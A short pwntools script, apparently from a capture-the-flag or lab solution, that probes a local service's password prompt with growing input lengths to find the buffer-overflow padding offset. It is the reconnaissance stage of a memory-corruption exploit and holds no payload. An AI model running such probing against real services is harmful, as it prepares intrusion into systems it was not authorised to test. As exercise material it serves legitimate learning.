from pwn import *
def pad():
    i=1
    while 1:
        try:
            io = remote('127.0.0.1',9999)
            io.recvuntil('WelCome my friend,Do you know password?\n')
            payload = b'a'*i
            io.sendline(payload)
            data = io.recv()
            io.close()
            print(i)
            if not data.startswith('No password, no game'):
                return i-1
            else:
                i+=1
        except EOFError:
            io.close()
            return i-1
pad = pad()
print('The padding is %d' %int(pad+1))
